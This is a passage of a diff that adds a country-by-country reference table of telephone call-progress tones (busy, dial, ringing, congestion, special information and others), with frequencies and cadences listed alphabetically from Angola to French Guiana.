+	Call waiting tone - II (2)	425	0.2 on 0.2 off 0.2 on 8.0 off
+
+Angola (Republic of)
+	Busy tone -	400	0.5 on 0.5 off
+	Congestion tone -	400	0.5 on 0.5 off
+	Dial tone -	400	continuous
+	Number unobtainable tone -	400	0.2 on 0.2 off
+	Ringing tone -	25	1.0 on 5.0 off
+	Waiting tone -	400	1.0 on 5.0 off
+
+Anguilla
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Recall dial tone -	350+440	3x(0.1 on 0.1 off) + continuous
+	Number unobtainable tone -	480+620	0.25 on 0.25 off
+        Payphone recognition tone -     1600/1143       0.2 on 0.2 off
+                                                        0.2 on 2.0 off
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone - operator intervening	450	0.2 on 0.2 off
+                                                        0.65 on 0.2 off
+	Waiting tone -	440	1x(0.5 on 10.0 off 0.5 on)
+
+Antigua and Barbuda
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Pay tone -	622	0.136 on 0.136 off
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	announcement
+	Call waiting tone -	480	1x(0.6 on 10.0 off)
+
+Saudi Arabia (Kingdom of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Conference tone -	425	0.5 on 2.0 off 0.5 on 15.0 off
+	Dial tone -	425	continuous
+        Payphone recognition tone -     1600/1200       0.2 on 0.2 off
+                                                        0.2 on 4.0 off
+	Ringing tone -	425	1.2 on 4.6 off
+	Call waiting tone -	425	0.15 on 0.2 off 0.15 on 10.0 off
+
+Argentine Republic
+	Busy tone -	425	0.3 on 0.2 off
+	Congestion tone -	425	0.3 on 0.4 off
+	Dial tone -	425	continuous
+	End of three party service tone -	950/1400/1800	1x(3x0.33 on)
+	Ringing tone -	425	1.0 on 4.0 off
+	Service activated tone -	425	1.0 on 0.25 off
+	Warning tone - operator intervening	1400	5x0.1 on 1.9 off
+	Waiting tone -	425	0.4 on 0.2 off 0.4 on 4.0 off
+	Call waiting tone -	425	0.3 on 10.0 off
+
+Aruba
+	Busy tone -	425	0.5 on 0.5 off
+	Confirmation tone -	425	continuous
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Refusal tone -	425	0.06 on 0.06 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	425	0.2 on 0.2 off 0.2 on 4.4 off
+
+Ascension
+	Busy tone -	400	0.384 on 0.384 off
+	Congestion tone -	400	continuous
+	Dial tone -	350+450	continuous
+	Number unobtainable tone -	400	continuous
+	Ringing tone -	400+450	0.384 on 0.192 off 0.384 on 2.016 off
+	Call waiting tone -	1400	1x(0.384 on)
+
+Australia
+	Busy tone -	425	0.375 on 0.375 off
+	Congestion tone -	425	0.375 on 0.375 off
+        Conference tone -       425//525        1.0 on 15.0 off 0.36 on 15.0off
+	Dial tone -	425x25//400+425+450	continuous
+	Facilities tone -	425	continuous
+	Intrusion tone -	425//525	continuous
+	Number unobtainable tone -	425	2.5 on 0.5 off
+	Payphone recognition tone -	1209/852	0.2 on 0.2 off
+                                                        0.2 on 2.0 off
+	Record tone -	1400	0.425 on 15.0 off
+	Ringing tone -	400x25//400+425+450//4	0.4 on 0.2 off 0.4 on 2.0 off
+	00+450
+	Warning tone - operator intervening	900	0.5 on
+	Call waiting tone -	425	0.2 on 0.2 off 0.2 on 4.4 off
+
+Austria
+	Busy tone - I	420	0.4 on 0.4 off
+	Busy tone - II (5)	450	0.3 on 0.3 off
+	Congestion tone - I	420	0.2 on 0.2 off
+	Congestion tone - II (5)	450	0.3 on 0.3 off
+	Dial tone -	420//450	continuous
+	Recall dial tone -	420	continuous
+	Special dial tone -	380+420	continuous
+	Negative indication tone -	380+420	0.4 on 0.4 off
+	Number unobtainable tone -	950/1400/1800	3x0.33 on 1.0 off
+	Pay tone -	852	1.5 on
+	Positive indication tone -	380+420	1.0 on 5.0 off
+        Payphone recognition tone -     1336/1633       0.2 on 0.2 off
+                                                        0.2 on 2.0 off
+	Ringing tone -	420//450	1.0 on 5.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone - operator intervening	420//450	0.15 on 0.15 off
+                                                                0.15 on 1.95 off
+	Waiting tone -	420	0.04 on 1.95 off
+
+Bahamas (Commonwealth of the)
+	Busy tone -	480/620/420//400	0.5 on 0.5 off
+	Ringing tone -	440/480//420/20//400	2.0 on 4.0 off
+
+Bahrain (State of)
+	Acceptance tone -	425	0.06 on 0.06 off
+	Busy tone -	425	0.375 on 0.375 off
+	Congestion tone -	425	0.40 on 0.35 off 0.225 on 0.525 off
+	Dial tone -	330x440	continuous
+	Number unobtainable tone -	425	continuous
+	Pay tone -	816/1209	O.125 on 1.5 off
+	Ringing tone -	425	0.4 on 0.2 off 0.4 on 2.0 off
+	Route tone -	425	0.06 on 0.06 off
+	Call waiting tone -	425	0.2 on 0.6 off 0.2 on 5.0 off
+
+Bangladesh (People's Republic of)
+	Busy tone -	450	0.2 on 0.3 off 0.7 on 0.8 off
+	Congestion tone -	450	0.25 on 0.25 off
+	Dial tone -	450	continuous
+	Special dial tone -	450	0.4 on 0.4 off
+	Howler tone -	3000	continuous
+	Pay tone -	800/1900	continuous
+	Ringing tone -	450	1.0 on 4.0 off
+	Warning tone - operator intervening	450	0.20 on 0.02 off
+                                                        0.20 on 1.40 off
+	Call waiting tone -	450	3.0 on 10.0 off
+
+Barbados
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on
+	Call waiting tone -	440	2x(0.3 on 10.0 off)
+
+Belarus (Republic of)
+	Busy tone -	425	0.4 on 0.4 off
+	Ringing tone -	425	0.8 on 3.2 off
+
+Belgium
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.167 on 0.167 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	1.0 on 0.25 off
+	Holding tone -	1400	0.4 on 15.0 off
+	Ringing tone -	425	1.0 on 3.0 off
+	Special information tone -	900/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	1400	0.175 on 0.175 off 0.175 on 3.50 off
+
+Benin (Republic of)
+	Busy tone -	440//425	0.5 on 0.5 off
+	Congestion tone -	announcement
+	Dial tone -	440//425	continuous
+	Special dial tone -	330+440	continuous	Pay tone -	announcement
+	Ringing tone -	440//425	1.7 on 3.3 off
+	Route tone -	440//425	0.05 on 0.05 off
+	Special information tone -	announcement
+	Call waiting tone -	440	continuous
+
+Bermuda
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	913/1428/1776	0.27 on 0.38 on 0.38 on
+	Call waiting tone - (6)	440
+
+Bhutan (Kingdom of)
+	Busy tone -	400	0.6 on 0.6 off
+	Dial tone -	400+25	continuous
+	Number unobtainable tone -	400	continuous
+	Offering tone, trunk -	450	0.2 on 0.2 off 0.2 on 0.6 off
+	Ringing tone -	400+25	0.4 on 0.2 off 0.4 on 2.6 off
+	Waiting tone -	400	0.5 on 0.25 off
+
+Botswana (Republic of)
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	350+450	continuous
+	Number unobtainable tone -	400	continuous
+	Payphone recognition tone -	1600	0.07 on 2.0 off
+	Ringing tone -	400//450	0.4 on 0.2 off 0.4 on 2.0 off
+	Warning tone - operator intervening	425	0.16 on 2.0 off
+	Waiting tone -	425	0.2 on 1.0 off
+
+Brazil (Federative Republic of)
+	Busy tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Dial tone - pabx	425	0.975 on 0.05 off
+	Executive override tone -	750	0.02 on 1.0 off
+	Function acknowledge tone -	425	0.1 on 0.1 off 0.1 on 2.0 off
+        Number unobtainable tone -      425     0.75 on 0.25 off 0.25 on 0.25off
+	Pay tone -	300	0.75 on
+	Ringing tone -	425	1.0 on 4.0 off
+	Waiting tone -	425	0.05 on 1.0 off
+
+Brunei Darussalam
+	Busy tone -	400	0.375 on 0.375 off
+	Confirmation tone -	400x24	0.1 on 0.1 off 0.3 on 0.3 off
+	Congestion tone -	400	0.375 on 0.375 off
+	Dial tone -	400x50	continuous
+	Special dial tone -	400x24	0.1 on 0.1 off
+	Holding tone -	400x24	0.5 on 2.5 off
+	Number unobtainable tone -	400	continuous
+	Ringing tone -	400+450	0.4 on 0.2 off 0.4 on 0.2 off
+	Warning tone - end of period	400	0.624 on 4.376 off
+	Warning tone - operator intervening	400	0.25 on 2.0 off
+	Warning tone - pip tone	900	0.25 on 0.25 off
+	Waiting tone -	400	0.3 on 0.25 off
+	Call waiting tone -	400x24	0.5 on 0.25 off
+
+Bulgaria (Republic of)
+	Busy tone - I	425	0.5 on 0.5 off
+	Busy tone - II	425	0.2 on 0.5 off
+	Busy tone - III	425	0.25 on 0.25 off
+	Congestion tone - I	425	0.25 on 0.25 off
+	Congestion tone - II	425	0.2 on 0.5 off
+	Congestion tone - III	425	0.5 on 0.5 off
+	Dial tone - I	425	continuous
+	Dial tone - II	425	0.25 on 0.75 off 0.75 on 1.0 off
+	Dial tone - III	425	0.25 on 0.3 off 0.7 on 0.8 off
+	Special dial tone -	425	1.5 on 0.1 off
+	Holding tone -	950/950/1400	0.65 on 0.32 off 0.32 on 0.32 off
+                                         1.30 on 2.60 off
+	Intrusion tone -	425	0.25 on 0.24 off 0.24 on 1.20 off
+	Payphone recognition tone -	1100+1750/750+1450	0.2 on 0.2 off
+                                                                0.2 on 2.0 off
+	Ringing tone - I	425	1.0 on 4.0 off
+	Ringing tone - II	425	1.0 on 9.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone -	1400	0.35 on 0.50 off
+	Call waiting tone -	425	0.15 on 0.15 off 0.15 on 4.0 off
+
+Burkina Faso
+	Acceptance tone -	425	1.0 on 4.0 off
+	Busy tone -	425//440//620	0.5 on 0.5 off
+	Confirmation tone -	350	0128 on 0.128 off 0.384 on
+	Congestion tone -	425//620	0.25 on 0.25 off
+	Dial tone -	425//440	continuous
+	Ringing tone - I	425	1.0 on 4.0 off
+	Ringing tone - II	440	1.7 on 3.3 off
+	Ringing tone - III	480	2.0 on 4.0 off
+	Route tone -	425	0.05 on 0.05 off
+        Special information tone -      900/1380/1860   0.35 on 0.30 on
+                                                        0.35 on 1.0 off
+Burundi (Republic of)
+	Acceptance tone -	950	continuous
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	0.4 on 0.04 off
+	Ringing tone -	425	1.7 on 3.3 off
+	Route tone -	425	0.5 on 0.5 off
+	Special information tone -	900	0.33 on 0.03 off
+
+Cameroon (Republic of)
+	Busy tone -	440	0.5 on 0.5 off
+	Congestion tone -	440	0.25 on 0.25 off
+	Dial tone -	440	continuous
+	Second dial tone -	330+440	continuous
+	Pay tone -	12000	continuous
+	Ringing tone -	440	1.7 on 3.3 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	440	0.2 on 0.6 off 0.2 on
+
+Canada
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Call waiting tone -	440	2x(0.3 on 10.0 off)
+
+Cayman Islands
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+COUNTRY/TONE	FREQUENCY in Hz	CADENCE in seconds
+
+	Number unobtainable tone -	425	0.25 on 0.25 off
+	Ringing tone -	425	1.0 on 4.0 off
+
+Central African Republic
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Second dial tone -	425+330	continuous
+	Number unobtainable tone -	425	0.5 on 0.5 off
+	Pay tone -	12000	0.15 on 0.15 off
+	Ringing tone -	425	1.7 on 3.3 off
+	Route tone -	425	0.05 on 0.05 off
+	Special information tone -	950/1400/1800	3x0.33 on 2x0.30 off
+
+Chile
+	Busy tone -	400	0.5 on 0.5 off
+	Congestion tone -	400	0.2 on 0.2 off
+	Dial tone -	400	continuous
+	Second dial tone -	330+440	continuous
+	Identification tone -	800/1200	0.6 on 2.0 off 0.6 on 2.0 off
+        Payphone recognition tone -     1100+1750/750+1450      0.2 on 0.2 off
+                                                                0.2 on 2.0 off
+	Ringing tone -	400	1.0 on 3.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Warning tone - end of period	800	2.0 on
+	Warning tone - operator intervening	1400	0.5 on 15.0 off
+	Waiting tone -	900+1300	0.5 on 0.5 off
+
+China (People's Republic of)
+	Busy tone -	450	0.35 on 0.35 off
+	Congestion tone -	450	0.7 on 0.7 off
+	Dial tone -	450	continuous
+	Second dial tone -	450	continuous
+	Intrusion tone -	450	0.2 on 0.2 off 0.2 on 0.6 off
+	Number unobtainable tone -	450	3x(0.1 on 0.1 off) 0.4 on 0.4 off
+	Ringing tone -	450	1.0 on 4.0 off
+	Special information tone - I	450	0.4 on 0.04 off
+	Special information tone - II	950	0.4 on 10.0 off
+	Waiting tone -	450	0.4 on 4.0 off
+
+Cyprus (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	350+450	continuous
+	Number unobtainable tone -	425	2.5 on 0.5 off
+	Pay tone -	1638/1206/943	3x(0.068 on 0.068 off)
+	Ringing tone -	425	1.5 on 3.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone - operator intervening	1400	0.5 on 14.0 off
+	Call waiting tone -	425	0.1 on 0.1 off 0.1 on 5.3 off
+
+Colombia (Republic of)
+	Busy tone -	425	0.25 on 0.25 off
+        Congestion tone -       425     0.10 on 0.25 off 0.35 on
+                                        0.25 off 0.65 on 0.25 off
+	Dial tone -	425	continuous
+	Number unobtainable tone -	425	0.65 on 0.25 off 0.20 on 0.60 off
+	Pay tone -	50/12000/16000	0.15 on
+	Ringing tone -	425	1.0 on 4.5 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+
+Comoros (Islamic Federal Republic of the)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440	continuous
+	Second dial tone -	330+440	continuous
+	Ringing tone -	440	1.71 on 0.05 off
+	Route tone -	440	0.05 on 0.05 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+
+Korea (Republic of)
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.3 on 0.2 off
+	Dial tone -	350+440	continuous
+	Recall dial tone - I	400//450	1.0 on 4.0 off
+	Recall dial tone - II	400//450	1.0 on 2.0 off
+	Intercept tone -	350+440	0.125 on 0.25 off 0.125 on 1.5 off
+	Number unobtainable tone -	450	0.2 on 0.1 off 0.2 on 1.5 off
+	Ringing tone -	440+480	1.0 on 2.0 off
+	Warning tone - operator intervening	392/494/587	2x(0.5 on 0.5 on
+                                                                         1.5 on)
+	Waiting tone -	350+440	0.25 on 0.25 off 0.25 on 3.25 off
+
+Costa Rica
+	Busy tone -	425	0.3 on 0.3 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	1.2 on 4.6 off
+
+Côte d'Ivoire (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	announcement
+	Dial tone -	425	continuous
+	Second dial tone -	440+330	continuous
+	Line lock-out tone -	425	0.4 on 0.04 off
+	Pay tone -	12000
+	Ringing tone -	425	1.5 on 3.0 off
+	Special information tone -	announcement
+	Call waiting tone - (6)	425
+
+Croatia (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	0.2 on 0.3 off 0.7 on 0.8 off
+	Payphone recognition tone -	1206/850	4x(0.2 on 0.2 off
+                                                           0.2 on 0.2 off)
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Call waiting tone -	425	0.3 on 8.0 off
+
+Cuba
+	Acceptance tone -	425	continuous
+	Busy tone -	600x120//620+480//425/	0.5 on 0.5 off
+	/400
+	Congestion tone -	600x120//425//400	0.25 on 0.25 off
+	Dial tone - I	600x120//425	continuous
+	Dial tone - II	425	0.75 on 0.75 off 0.25 on 0.25 off
+	Negative indication tone -	425	0.5 on 0.5 off
+	Ringing tone - I	425	1.0 on 4.0 off
+	Ringing tone - II	440+480//440+620//480+	2.0 on 4.0 off
+	620
+	Ringing tone - III	420x40	1.0 on 2.0 off
+	Ringing tone - IV	400+450	0.4 on 0.2 off 0.4 on 2.0 off
+	Special information tone - I	950/1400/1800	(3x0.33 on 2x0.33 off)
+                                                                      1.0 off
+        Special information tone - II   400     4x(0.075 on 0.10 off) 0.30 off
+	Warning tone - I, operator 	425	0.1 on 4.9 off
+	intervening
+	Warning tone - II,operator 	425	0.5 on 0.2 off
+	intervening
+	Call waiting tone - I	425	0.2 on 0.6 off 0.2 on
+	Call waiting tone - II	400	0.5 on 0.5 off
+
+Denmark
+	Busy tone - I	425	0.25 on 0.25 off
+	Busy tone - II (1)	425	0.5 on 0.5 off
+	Congestion tone - I	425	0.25 on 0.25 off
+	Congestion tone - II (1)	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.00 off
+	Call waiting tone - I	425	0.2 on 0.2 off 0.2 on 3.6 off 0.2 on
+                                                              0.2 off 0.2 on
+	Call waiting tone - II (1)	425	0.2 on 0.6 off 0.2 on 3.0 off
+                                                        0.2 on 0.6 off 0.2 on
+Diego Garcia
+	Busy tone -	480/620	interrupted at 60 ipm
+	Dial tone -	350/440	continuous
+	Number unobtainable tone -	480/620	interrupted at 120 ipm
+	Ringing tone -	440/480	1.0 on 3.0 off
+
+Djibouti (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	1.5 on 3.5 off
+	Route tone -	425	0.05 on 0.05 off
+
+Dominican Republic
+	Busy tone - I	400	0.8 on 0.8 off
+	Busy tone - II	400	0.375 on 0.375 off
+	Congestion tone - I	400	0.8 on 0.8 off
+	Congestion tone - II	400	0.375 on 0.375 off
+	Dial tone - I	50	continuous
+	Dial tone - II	33	0.0166 on 0.0166 off
+	Number unobtainable tone -	400	continuous
+	Ringing tone -	400//450	0.4 on 0.2 off 0.4 on 2.2 off
+
+Dominica (Commonwealth of)
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	440	1x(0.5 on 10.0 off 0.5 on)
+
+Egypt (Arab Republic of)
+	Busy tone -	425x50	1.0 on 4.0 off
+	Congestion tone -	450	0.5 on 0.5 off
+	Intrusion tone -	450	0.5 on 0.5 off
+	Payphone recognition tone -	1100+1750/750+1450	0.2 on 0.2 off
+                                                                 0.2 on 2.0 off
+	Ringing tone -	425x50	2.0 on 1.0 off
+	Special information tone -	950/1400/1800	0.33 on 0.33 off
+                                        0.33 on 0.33 off 0.33 on 0.33 off
+
+El Salvador (Republic of)
+	Busy tone -	425	0.32 on 0.32 off
+	Congestion tone -	425	0.32 on 0.32 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	0.40 on 0.04 off
+	Intrusion tone -	425	0.20 on 0.20 off 0.50 on 0.20 off
+	Line lock-out tone -	425	0.167 on 0.167 off 0.500 on 0.167 off
+	Ringing tone -	425	1.2 on 4.6 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.00 off
+	Warning tone -	1400	0.20 on 0.60 off
+	Call waiting tone -	425	0.35 on 15.0 off
+
+United Arab Emirates
+	Busy tone -	400//425	0.375 on 0.375 off
+	Congestion tone -	400//425	0.4 on 0.35 off 0.225 on
+                                                               0.525 off
+	Dial tone -	350+440	continuous
+	Number unobtainable tone -	400//425	continuous
+	Ringing tone -	400+450//425	0.4 on 0.2 off 0.4 on 2.0 off
+
+Ecuador
+	Busy tone -	425	0.33 on 0.33 off
+	Congestion tone -	425	0.33 on 0.33 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	1.2 on 4.65 off
+	Call waiting tone -	425	0.2 on 0.6 off
+
+Spain
+	Busy tone -	425	0.2 on 0.2 off
+	Congestion tone -	425	2x(0.2 on 0.2 off) 0.2 on 0.6 off
+	Dial tone -	425	continuous
+	Second dial tone -	600	continuous
+	Special dial tone -	425	1.0 on 0.1 off
+	Number unobtainable tone -	425	0.2 on 0.2 off 0.2 on 0.6 off
+        Payphone recognition tone - I   1600  0.05 on 0.05 off 0.05 on 1.55 off
+        Payphone recognition tone - II  1600  0.05 on 0.05 off 0.05 on 0.05 off
+                                                                0.05 on 1.5 off
+	Ringing tone -	425	1.5 on 3.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Warning tone - operator intervening	1400	0.4 on 5.0 off
+	Call waiting tone -	425	0.175 on 0.175 off 0.175 on 3.5 off
+
+Estonia (Republic of)
+	Busy tone -	425	0.3 on 0.3 off
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Intrusion tone -	425	0.2 on 0.3 off 0.2 on 1.3 off
+	Pay tone -	16000	0.15 on 0.35 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	950/1400/1800	3x0.33 on 0.3 off
+
+United States of America
+	Busy tone -	600x120//600x133//600x	0.5 on 0.5 off
+	140//600x160//480+620
+	Confirmation tone -	350+440	3x(0.1 on 0.1 off)
+	Dial tone -	600x120//600x133//600x	continuous
+	140//600x160//350+440
+	Recall dial tone -	350+440	3x(0.1 on 0.1 off) + continuous
+	Intrusion tone -	600x120//600x133//600x	0.5 on 0.5 off
+	140//600x160//480+620
+	Number unobtainable tone -	200//400	0.5 on 6.0 off
+	Permanent signal tone -	480//400//500	continuous
+	Record tone -	440	0.5 on 5.0 off
+	Ringing tone -	420x40//500x40//440+48	2.0 on 4.0 off
+	0
+	Re-order tone -	600x120//600x133//600x	0.3 on 0.2 off
+	140//600x160//480+620
+	Warning tone - recorder (4)	1400	0.5 on
+	Call waiting tone -	440	2x(0.3 on 10.0 off)
+
+Ethiopia (Federal Democratic Republic of)
+	Acceptance tone -	425	continuous
+	Busy tone -	425	0.4 on 0.4 off
+	Congestion tone -	425	0.4 on 0.4 off
+	Dial tone -	425	continuous
+	Special dial tone -	425	0.4 on 0.04 off
+	Intrusion tone -	425	0.5 on 0.2 off
+	Line lock-out tone -	425	0.4 on 0.4 off
+	Refusal tone -	425	0.4 on 0.4 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone -	1400	0.5 on 11.5 off
+	Call waiting tone -	425	0.2 on 0.6 off
+
+Falkland Islands (Malvinas)
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	400	0.4 on 0.35 off 0.255 on 0.525 off
+	Dial tone -	350+450	continuous
+	Number unobtainable tone -	400	continuous
+	Ringing tone -	400+450	0.4 on 0.2 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone - operator intervening	1000	0.1 on 0.1 off
+
+Faroe Islands (Denmark)
+	Busy tone -	425	0.25 on 0.25 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Number unobtainable tone -	950/1400/1800	3x0.33 on 1.0 off
+	Ringing tone -	425	1.0 on 4.0 off
+
+Fiji (Republic of)
+	Acceptance tone -	425	continuous
+	Busy tone -	425	0.75 on 0.75 off
+	Congestion tone -	425	037 on 0.37 off 0.37 on 0.37 off
+	Dial tone -	400+450	continuous
+	Second dial tone -	425	continuous
+	Special dial tone -	400+450	0.40 on 0.04 off
+	Line lock-out tone -	425	0.2 on 0.6 off 0.2 on 4.0 off
+	Number unobtainable tone -	400	2.5 on 0.5 off
+	Offering tone, trunk -	425	0.17 on 0.17 off 0.50 on 0.17 off
+	Refusal tone -	425	0.24 on 0.76 off
+	Ringing tone -	425x25	0.4 on 0.2 off 0.4 on 2.0 off
+	Special ringing tone -	425x25	1.0 on 5.0 off 1.0 on 5.0 off
+	Special information tone -	925/1400/1800	3x0.38 on 1.00 off
+	Warning tone -	1400	0.5 on 12.0 off
+
+Finland
+	Busy tone -	425	0.3 on 0.3 off
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Dial tone - pabx	425	2x(0.2 on 0.3 off) 0.2 on 0.8 off
+	Special dial tone -	425	0.65 on 0.025 off
+	Queue tone -	950/950/1400	0.65 on 0.325 off 0.325 on 1.3 on
+                                                                 2.6 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Warning tone - operator intervening	425	0.2 on 0.3 off 0.2 on
+                                                                1.3 off
+	Call waiting tone -	425	0.15 on 8.0 off
+
+France
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440//330+440	continuous
+	Ringing tone -	440	1.5 on 3.5 off
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+	Call waiting tone -	440	2x(0.3 on 8.0 off 0.4 on 8.0 off 0.3 on
+                                                                        8.0 off)
+Gabonese Republic
+	Busy tone -	440	0.5 on 0.5 off
+	Congestion tone -	440	0.5 on 0.5 off
+	Dial tone -	440	continuous
+	Second dial tone -	330 + 440	continuous
+	Special dial tone -	440	0.4 on 0.04 off
+	Holding tone -	440	0.5 on 2.5 off
+	Ringing tone -	440	1.7 on 3.3 off
+	Special information tone -	950/1400	0.30 on 0.33 on
+	Call waiting tone -	440	continuous
+
+Gambia (Republic of the)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	1400	0.330 on 0.030 off
+	Call waiting tone -	950	0.330 on 0.030 off
+
+Ghana
+	Busy tone -	400	0.25 on 0.25 off
+	Congestion tone -	400	0.5 on 0.5 off
+	Dial tone -	400	continuous
+	Holding tone -	400	0.5 on 0.5 off 0.5 on 0.25 off
+	Number unobtainable tone -	400	0.075 on 0.1 off 0.075 on
+                                                0.1 off 0.075 on 0.4 off
+	Ringing tone -	400	1.0 on 4.0 off
+	Waiting tone -	400	0.5 on 0.3 on 0.2 off 0.3 on 0.2 off 3.0 off
+
+Gibraltar
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	400	0.4 on 0.35 off 0.225 on 0.525 off
+	Dial tone -	350+400	continuous
+	Number unobtainable tone -	400	continuous
+	Ringing tone -	400+450	0.4 on 0.2 off 0.4 on 2.0 off
+	Waiting tone -	400	0.1 on 3.0 off
+
+Greece
+	Busy tone -	425	0.3 on 0.3 off
+	Congestion tone -	425	0.15 on 0.15 off
+	Dial tone -	425	0.2 on 0.3 off 0.7 on 0.8 off
+	Special dial tone -	400/425//425/450	0.2 on 0.3 off 0.7 on
+                                                                      0.8 off
+	Holding tone -	900	0.5 on 0.5 off
+	Intrusion tone -	425	0.15 on 0.25 off 0.15 on 1.45 off
+	Number unobtainable tone -	450	continuous
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	850/1450/1800	3x0.33 on 1.0 off
+	Valid tone (radio-paging) -	450	0.1 on 0.1 off 0.1 on 0.7 off
+	Call waiting tone -	425	0.3 on 10.0 off 0.3 on 10.0 off
+
+Grenada
+	Busy tone -	460+620	0.5 on 0.5 off
+	Congestion tone -	announcement
+	Ringing tone -	440+480	2.0 on 4.0 off
+
+Greenland (Denmark)
+	Busy tone -	445//425	0.25 on 0.25 off
+	Congestion tone -	445//425	0.25 on 0.25 off
+	Dial tone -	445//425	continuous
+	Second dial tone -	445//425	continuous
+	Number unobtainable tone - I	950/1400/1800	3x0.33 on 1.0 off
+	Number unobtainable tone - II	425	0.25 on 0.25 off
+	Pay tone -	950/1400/1800	3x0.22 on 1.0 off
+	Ringing tone -	445//425	1.0 on 4.0 off
+
+Guadeloupe (French Department of)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440//330+440	continuous
+	Ringing tone -	440	1.5 on 3.5 off
+COUNTRY/TONE	FREQUENCY in Hz	CADENCE in seconds
+
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+	Call waiting tone -	440	2x(0.3 on 8.0 off 0.4 on 8.0 off
+                                                        0.3 on 8.0 off)
+
+Guinea (Republic of)
+	Busy tone -	450	0.2 on 0.2 off
+	Ringing tone -	450	0.4 on 0.2 off
+
+Guyana
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.5 on 0.5 off
+	Dial tone -	360/400	1.3 on 0.3 off 0.2 on 0.5 off
+	Ringing tone -	425	1.75 on 3.25 off
+	Waiting tone -	480	0.5 on 18.0 off
+
+Guiana (French Department of)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440//330+440	continuous
